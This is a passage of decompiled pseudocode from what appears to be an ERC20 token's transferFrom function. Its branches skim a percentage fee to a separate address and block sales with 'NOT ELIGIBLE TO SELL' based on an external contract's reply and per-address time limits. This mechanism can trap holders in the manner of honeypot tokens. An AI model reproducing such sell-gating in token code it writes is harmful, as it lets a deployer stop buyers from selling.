                    sub_944482af[address(arg1)] = block.timestamp
                    if not sub_fd80fb60:
                        if not arg1:
                            revert with 0x8c379a000000000000000000000000000000000000000000000000000000000, 'ERC20: transfer from the zero address'
                        if not arg2:
                            revert with 0x8c379a000000000000000000000000000000000000000000000000000000000, 'ERC20: transfer to the zero address'
                        if balanceOf[address(arg1)] < arg3:
                            revert with 0x8c379a000000000000000000000000000000000000000000000000000000000, 'ERC20: transfer amount exceeds balance'
                        balanceOf[address(arg1)] -= arg3
                        if balanceOf[arg2] > !arg3:
                            revert with 0, 17
                        balanceOf[arg2] += arg3
                        emit Transfer(arg3, arg1, arg2);
                    else:
                        if sub_fd80fb60 > 100:
                            if not arg1:
                                revert with 0x8c379a000000000000000000000000000000000000000000000000000000000, 'ERC20: transfer from the zero address'
                            if not arg2:
                                revert with 0x8c379a000000000000000000000000000000000000000000000000000000000, 'ERC20: transfer to the zero address'
                            if balanceOf[address(arg1)] < arg3:
                                revert with 0x8c379a000000000000000000000000000000000000000000000000000000000, 'ERC20: transfer amount exceeds balance'
                            balanceOf[address(arg1)] -= arg3
                            if balanceOf[arg2] > !arg3:
                                revert with 0, 17
                            balanceOf[arg2] += arg3
                            emit Transfer(arg3, arg1, arg2);
                        else:
                            if arg3 and sub_fd80fb60 > -1 / arg3:
                                revert with 0, 17
                            if not arg1:
                                revert with 0x8c379a000000000000000000000000000000000000000000000000000000000, 'ERC20: transfer from the zero address'
                            if not sub_9bb5cd3fAddress:
                                revert with 0x8c379a000000000000000000000000000000000000000000000000000000000, 'ERC20: transfer to the zero address'
                            if balanceOf[address(arg1)] < arg3 * sub_fd80fb60 / 100:
                                revert with 0x8c379a000000000000000000000000000000000000000000000000000000000, 'ERC20: transfer amount exceeds balance'
                            balanceOf[address(arg1)] -= arg3 * sub_fd80fb60 / 100
                            if balanceOf[stor16] > !(arg3 * sub_fd80fb60 / 100):
                                revert with 0, 17
                            balanceOf[stor16] += arg3 * sub_fd80fb60 / 100
                            emit Transfer((arg3 * sub_fd80fb60 / 100), arg1, sub_9bb5cd3fAddress);
                            if arg3 < arg3 * sub_fd80fb60 / 100:
                                revert with 0, 17
                            if not arg1:
                                revert with 0x8c379a000000000000000000000000000000000000000000000000000000000, 'ERC20: transfer from the zero address'
                            if not arg2:
                                revert with 0x8c379a000000000000000000000000000000000000000000000000000000000, 'ERC20: transfer to the zero address'
                            if balanceOf[address(arg1)] < arg3 - (arg3 * sub_fd80fb60 / 100):
                                revert with 0x8c379a000000000000000000000000000000000000000000000000000000000, 'ERC20: transfer amount exceeds balance'
                            balanceOf[address(arg1)] = balanceOf[address(arg1)] - arg3 + (arg3 * sub_fd80fb60 / 100)
                            if balanceOf[arg2] > !(arg3 - (arg3 * sub_fd80fb60 / 100)):
                                revert with 0, 17
                            balanceOf[arg2] = balanceOf[arg2] + arg3 - (arg3 * sub_fd80fb60 / 100)
                            emit Transfer((arg3 - (arg3 * sub_fd80fb60 / 100)), arg1, arg2);
                    if allowance[address(arg1)][msg.sender] < arg3:
                        revert with 0x8c379a000000000000000000000000000000000000000000000000000000000, 'ERC20: transfer amount exceeds allowance'
                    if not arg1:
                        revert with 0x8c379a000000000000000000000000000000000000000000000000000000000, 'ERC20: approve from the zero address'
                    if not msg.sender:
                        revert with 0x8c379a000000000000000000000000000000000000000000000000000000000, 'ERC20: approve to the zero address'
                else:
                    require ext_code.size(sub_9bb5cd3fAddress)
                    staticcall sub_9bb5cd3fAddress.0x4305235d with:
                            gas gas_remaining wei
                           args arg1
                    if not ext_call.success:
                        revert with ext_call.return_data[0 len return_data.size]
                    require return_data.size >= 32
                    if ext_call.return_data[0] and sub_ee76f759 > -1 / ext_call.return_data[0]:
                        revert with 0, 17
                    if not sub_76718ac5:
                        revert with 0, 18
                    if block.timestamp < sub_944482af[address(arg1)]:
                        revert with 0, 17
                    if block.timestamp - sub_944482af[address(arg1)] and ext_call.return_data[0] * sub_ee76f759 / sub_76718ac5 > -1 / block.timestamp - sub_944482af[address(arg1)]:
                        revert with 0, 17
                    if (block.timestamp * ext_call.return_data[0] * sub_ee76f759 / sub_76718ac5) - (sub_944482af[address(arg1)] * ext_call.return_data[0] * sub_ee76f759 / sub_76718ac5) < arg3:
                        revert with 0, 'NOT ELIGIBLE TO SELL'
                    sub_944482af[address(arg1)] = block.timestamp
                    if not sub_fd80fb60:
                        if not arg1:
                            revert with 0, 'ERC20: transfer from the zero address'
                        if not arg2:
                            revert with 0, 'ERC20: transfer to the zero address'
                        if balanceOf[address(arg1)] < arg3:
                            revert with 0, 'ERC20: transfer amount exceeds balance'
                        balanceOf[address(arg1)] -= arg3
                        if balanceOf[arg2] > !arg3:
                            revert with 0, 17
                        balanceOf[arg2] += arg3
                        emit Transfer(arg3, arg1, arg2);
                    else:
                        if sub_fd80fb60 > 100:
                            if not arg1:
                                revert with 0, 'ERC20: transfer from the zero address'
                            if not arg2:
                                revert with 0, 'ERC20: transfer to the zero address'
                            if balanceOf[address(arg1)] < arg3:
                                revert with 0, 'ERC20: transfer amount exceeds balance'
                            balanceOf[address(arg1)] -= arg3
                            if balanceOf[arg2] > !arg3:
                                revert with 0, 17
                            balanceOf[arg2] += arg3
                            emit Transfer(arg3, arg1, arg2);
                        else:
                            if arg3 and sub_fd80fb60 > -1 / arg3:
                                revert with 0, 17
                            if not arg1:
                                revert with 0, 'ERC20: transfer from the zero address'
                            if not sub_9bb5cd3fAddress:
                                revert with 0, 'ERC20: transfer to the zero address'
                            if balanceOf[address(arg1)] < arg3 * sub_fd80fb60 / 100:
                                revert with 0, 'ERC20: transfer amount exceeds balance'
                            balanceOf[address(arg1)] -= arg3 * sub_fd80fb60 / 100
                            if balanceOf[stor16] > !(arg3 * sub_fd80fb60 / 100):
                                revert with 0, 17
                            balanceOf[stor16] += arg3 * sub_fd80fb60 / 100
                            emit Transfer((arg3 * sub_fd80fb60 / 100), arg1, sub_9bb5cd3fAddress);
                            if arg3 < arg3 * sub_fd80fb60 / 100:
                                revert with 0, 17
                            if not arg1:
                                revert with 0, 'ERC20: transfer from the zero address'
                            if not arg2:
                                revert with 0, 'ERC20: transfer to the zero address'
                            if balanceOf[address(arg1)] < arg3 - (arg3 * sub_fd80fb60 / 100):
                                revert with 0, 'ERC20: transfer amount exceeds balance'
                            balanceOf[address(arg1)] = balanceOf[address(arg1)] - arg3 + (arg3 * sub_fd80fb60 / 100)
                            if balanceOf[arg2] > !(arg3 - (arg3 * sub_fd80fb60 / 100)):
                                revert with 0, 17
                            balanceOf[arg2] = balanceOf[arg2] + arg3 - (arg3 * sub_fd80fb60 / 100)
                            emit Transfer((arg3 - (arg3 * sub_fd80fb60 / 100)), arg1, arg2);
                    if allowance[address(arg1)][msg.sender] < arg3:
                        revert with 0, 'ERC20: transfer amount exceeds allowance'
                    if not arg1:
                        revert with 0, 'ERC20: approve from the zero address'
                    if not msg.sender:
                        revert with 0, 'ERC20: approve to the zero address'
            else:
                require ext_code.size(sub_9bb5cd3fAddress)
                staticcall sub_9bb5cd3fAddress.0x4305235d with:
                        gas gas_remaining wei
                       args arg1
                if not ext_call.success:
                    revert with ext_call.return_data[0 len return_data.size]
                require return_data.size >= 32
                if not ext_call.return_data[0]:
                    revert with 0, 'NOT ELIGIBLE TO SELL'
                if not sub_944482af[address(arg1)]:
                    if arg3 > sub_a6697d53:
                        revert with 0, 'NOT ELIGIBLE TO SELL'
                if sub_94c756a4:
                    if block.timestamp < sub_944482af[address(arg1)]:
                        revert with 0, 17
                    if block.timestamp - sub_944482af[address(arg1)] and sub_94c756a4 > -1 / block.timestamp - sub_944482af[address(arg1)]:
                        revert with 0, 17
                    if (block.timestamp * sub_94c756a4) - (sub_944482af[address(arg1)] * sub_94c756a4) < arg3:
                        revert with 0, 'NOT ELIGIBLE TO SELL'
                else:
                    require ext_code.size(sub_9bb5cd3fAddress)
                    staticcall sub_9bb5cd3fAddress.0x4305235d with:
                            gas gas_remaining wei
                           args arg1
                    if not ext_call.success:
                        revert with ext_call.return_data[0 len return_data.size]
                    require return_data.size >= 32
                    if ext_call.return_data[0] and sub_ee76f759 > -1 / ext_call.return_data[0]:
                        revert with 0, 17
                    if not sub_76718ac5:
                        revert with 0, 18
                    if block.timestamp < sub_944482af[address(arg1)]:
                        revert with 0, 17
                    if block.timestamp - sub_944482af[address(arg1)] and ext_call.return_data[0] * sub_ee76f759 / sub_76718ac5 > -1 / block.timestamp - sub_944482af[address(arg1)]:
                        revert with 0, 17
                    if (block.timestamp * ext_call.return_data[0] * sub_ee76f759 / sub_76718ac5) - (sub_944482af[address(arg1)] * ext_call.return_data[0] * sub_ee76f759 / sub_76718ac5) < arg3:
                        revert with 0, 'NOT ELIGIBLE TO SELL'
                sub_944482af[address(arg1)] = block.timestamp
                if not sub_fd80fb60:
                    if not arg1:
                        revert with 0, 'ERC20: transfer from the zero address'
                    if not arg2:
                        revert with 0, 'ERC20: transfer to the zero address'
                    if balanceOf[address(arg1)] < arg3:
                        revert with 0, 'ERC20: transfer amount exceeds balance'
                    balanceOf[address(arg1)] -= arg3
                    if balanceOf[arg2] > !arg3:
                        revert with 0, 17
                    balanceOf[arg2] += arg3
                    emit Transfer(arg3, arg1, arg2);
                else:
                    if sub_fd80fb60 > 100:
                        if not arg1:
                            revert with 0, 'ERC20: transfer from the zero address'
                        if not arg2:
                            revert with 0, 'ERC20: transfer to the zero address'
                        if balanceOf[address(arg1)] < arg3:
                            revert with 0, 'ERC20: transfer amount exceeds balance'
                        balanceOf[address(arg1)] -= arg3
                        if balanceOf[arg2] > !arg3:
                            revert with 0, 17
                        balanceOf[arg2] += arg3
                        emit Transfer(arg3, arg1, arg2);
                    else:
                        if arg3 and sub_fd80fb60 > -1 / arg3:
                            revert with 0, 17
                        if not arg1:
                            revert with 0, 'ERC20: transfer from the zero address'
                        if not sub_9bb5cd3fAddress:
                            revert with 0, 'ERC20: transfer to the zero address'
                        if balanceOf[address(arg1)] < arg3 * sub_fd80fb60 / 100:
                            revert with 0, 'ERC20: transfer amount exceeds balance'
                        balanceOf[address(arg1)] -= arg3 * sub_fd80fb60 / 100
                        if balanceOf[stor16] > !(arg3 * sub_fd80fb60 / 100):
                            revert with 0, 17
                        balanceOf[stor16] += arg3 * sub_fd80fb60 / 100
                        emit Transfer((arg3 * sub_fd80fb60 / 100), arg1, sub_9bb5cd3fAddress);
                        if arg3 < arg3 * sub_fd80fb60 / 100:
                            revert with 0, 17
                        if not arg1:
                            revert with 0, 'ERC20: transfer from the zero address'
                        if not arg2:
                            revert with 0, 'ERC20: transfer to the zero address'
                        if balanceOf[address(arg1)] < arg3 - (arg3 * sub_fd80fb60 / 100):
                            revert with 0, 'ERC20: transfer amount exceeds balance'
                        balanceOf[address(arg1)] = balanceOf[address(arg1)] - arg3 + (arg3 * sub_fd80fb60 / 100)
                        if balanceOf[arg2] > !(arg3 - (arg3 * sub_fd80fb60 / 100)):
                            revert with 0, 17
                        balanceOf[arg2] = balanceOf[arg2] + arg3 - (arg3 * sub_fd80fb60 / 100)
                        emit Transfer((arg3 - (arg3 * sub_fd80fb60 / 100)), arg1, arg2);
                if allowance[address(arg1)][msg.sender] < arg3:
                    revert with 0, 'ERC20: transfer amount exceeds allowance'
                if not arg1:
                    revert with 0, 'ERC20: approve from the zero address'
                if not msg.sender:
                    revert with 0, 'ERC20: approve to the zero address'
    ('bool', 'msg.sender')
    allowance[address(arg1)][address(msg.sender)] = allowance[address(arg1)][msg.sender] - arg3
    emit Approval((allowance[address(arg1)][msg.sender] - arg3), arg1, msg.sender);
    return 1
}



}
